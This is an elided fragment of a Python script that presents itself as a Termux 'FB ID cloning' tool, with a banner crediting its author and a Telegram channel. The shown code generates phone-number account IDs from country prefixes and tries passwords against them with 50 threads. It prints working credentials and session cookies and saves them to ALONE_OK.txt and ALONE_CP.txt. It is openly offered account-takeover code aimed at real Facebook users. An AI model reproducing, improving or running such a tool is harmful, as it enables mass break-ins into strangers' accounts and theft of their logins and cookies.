...
\x1b[38;5;196m`------'`------'`------'`------'`------'`------'`------'
 ...
 \033[1;93m**************************************************
 \033[1;93m|     \033[1;96m[🔥] CREATED BY\33[0;m   :  \033[1;96mALONE             \033[1;93m|
 \033[1;93m|     \033[1;32m[🔥] FACEBOK      : \033[1;34m ISFAQ EVAN DIPRO     \033[1;93m|
 \033[1;93m|     \033[1;35m[🔥] GITHUB       :  \033[1;35mevandipro2004     \033[1;93m|
 \033[1;93m|     \033[1;36m[🔥] TOOL STATUS  : \033[1;36m ACTIVE FREE        \033[1;93m|
 \033[1;93m|     \033[1;36m[🔥] TOOL VIRSION :  \033[1;36m0.1                 \033[1;93m|
 \033[1;93m|     \033[1;36m[🔥] TELEGRAM :  \033[1;36mt.me/termux_command_store      \033[1;93m|
 \033[1;93m**************************************************""")
try:
...
try:
    ...
    if str(v) in update:
        os.system('clear')
        os.system("espeak \"HELLO DEAR, ITS ALONE HERE. TCS FB ID CLONNING TOOL IS FLYING.  PLEASE WAIT \"")
    else:pass
...
def i():
    ...
    print("    \33[m\033[1;91m\033[1;41m\033[1;97m****************************************\033[;0m\033[1;91m\033[1;92m")
    print('    \033[97;1m[\033[92;1m🔥\033[97;1m]\033[38;5;46mAFGHANISTAN CODE    \033[38;5;196m:\033[1;97m 9378,9377,9370,9376,9379')
    print("    \33[m\033[1;91m\033[1;41m\033[1;97m****************************************\033[;0m\033[1;91m\033[1;92m")
    print('    \033[97;1m[\033[92;1m🔥\033[97;1m]\033[38;5;46mBANGLADESH🇧🇩 CODE    \033[38;5;196m:\033[1;97m 88016 88017 88018 88019')
    print("    \33[m\033[1;91m\033[1;41m\033[1;97m****************************************\033[;0m\033[1;91m\033[1;92m")
    code = input('    \033[38;5;196mINPUT CODE \033[1;97m: ')
    print("")
    os.system('clear')
    print(logo)
    print("             \033[1;97m[\033[1;33mALONE\033[1;97m]")
    print("    \33[m\033[1;91m\033[1;41m\033[1;97m****************************************\033[;0m\033[1;91m\033[1;92m")
    ...
    with ThreadPool(max_workers=50) as setu:
        ...
        # print('     \033[97;1m[\033[92;1m✔️\033[97;1m] \033[93;1mFILE SAVE \033[38;5;196m: \033[38;5;46mALONE_OK.txt')
        # print('     \033[97;1m[\033[92;1m✔️\033[97;1m] \033[93;1mFILE SAVE \033[38;5;196m: \033[38;5;196mALONE_CP.txt')
        print("     \33[m\033[1;91m\033[1;41m\033[1;97m********************************\033[;0m\033[1;91m\033[1;92m")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print('\033[38;5;46m[ALONE_OK[🔥] ' +uid+ '|' +ps+    '  \n   \033[1;33mCOOKIES[💉] : \033[38;5;46m'+coki+ ' ')                
                os.system("espeak \"sir,  ok ids\"")
                open('/sdcard/ALONE_OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print('\033[38;5;196m[ALONE_CP[😪] ' +uid+ '|' +ps+ '  \33[0;97m')
                ###os.system("espeak \"sir,  Cp ids\"")
                open('/sdcard/ALONE_CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
